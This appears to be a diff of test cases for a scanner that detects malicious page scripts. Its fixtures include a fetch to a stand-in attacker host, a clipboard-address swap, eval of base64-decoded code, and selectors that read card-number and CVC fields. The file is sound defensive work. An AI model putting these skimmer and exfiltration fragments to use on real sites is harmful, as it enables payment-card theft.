@@ -137,6 +137,53 @@ test("a skimmer matching input names with a regex like /cvv|cvc/ is card-field-a
   assert.equal(byId(scanScript(src, "x.example"), "card-field-access")?.severity, "high");
 });
 
+// ---- Review findings: AWS tenants, execCommand case, more indirect eval ----
+test("every amazonaws.com host (regional S3, API Gateway, …) is its own owner", () => {
+  const s3 = byId(scanScript(`fetch("https://evil.s3.eu-west-1.amazonaws.com/c")`, "vendor.s3.us-east-1.amazonaws.com"), "exfil-sink");
+  assert.match(s3?.evidence ?? "", /evil\.s3\.eu-west-1\.amazonaws\.com/);
+  const api = byId(scanScript(`fetch("https://abc.execute-api.us-east-1.amazonaws.com/c")`, "xyz.execute-api.us-east-1.amazonaws.com"), "exfil-sink");
+  assert.match(api?.evidence ?? "", /abc\.execute-api/);
+  assert.deepEqual(scanScript(`fetch("https://xyz.execute-api.us-east-1.amazonaws.com/c")`, "xyz.execute-api.us-east-1.amazonaws.com"), []);
+});
+
+test("execCommand command names match case-insensitively, as browsers treat them", () => {
+  const src = `ta.value = "0x000000000000000000000000000000000000dEaD"; document.execCommand('Copy');`;
+  assert.equal(byId(scanScript(src, "x.example"), "clipboard-hijack")?.severity, "high");
+});
+
+test("eval.call/apply and (0, window.eval) running base64-decoded code are an obfuscated-loader", () => {
+  for (const src of [`eval.call(null, atob(p))`, `eval.apply(null, [atob(p)])`, `(0, window.eval)(atob(p))`, `(0,globalThis.eval)(atob(p))`]) {
+    assert.equal(byId(scanScript(src, "x.example"), "obfuscated-loader")?.severity, "high", src);
+  }
+});
+
+test("evaluate.call near atob is not an obfuscated-loader", () => {
+  assert.deepEqual(scanScript(`var d = atob(x); xpath.evaluate.call(doc, d);`, "x.example"), []);
+});
+
+// ---- Review findings: card-field coverage ----
+test("Magento-style underscore card field names are card-field-access (Magecart's classic target)", () => {
+  for (const src of [
+    `document.querySelector("[name='payment[cc_number]']").value`,
+    `form["payment[cc_cid]"].value`,
+    `jQuery("#cc_exp_month").val()`,
+  ]) {
+    assert.equal(byId(scanScript(src, "x.example"), "card-field-access")?.severity, "high", src);
+  }
+});
+
+test("CSS class selectors and anchored regexes for card fields are card-field-access", () => {
+  for (const src of [`document.querySelector(".cc-number").value`, `if (/^cvc$/i.test(el.name)) grab(el);`]) {
+    assert.equal(byId(scanScript(src, "x.example"), "card-field-access")?.severity, "high", src);
+  }
+});
+
+test("words that only start like card fields are not card-field-access", () => {
+  for (const src of [`var x = "cc-numeric";`, `opts.cvcValid = true;`, `var dir = ".ccache";`, `var s = "#ccx";`]) {
+    assert.equal(byId(scanScript(src, "x.example"), "card-field-access"), undefined, src);
+  }
+});
+
 // ---- Open review points: false positives ----
 test("identifiers named Cvc/cvc (class, call, parameter) are not card-field-access", () => {
   for (const src of [
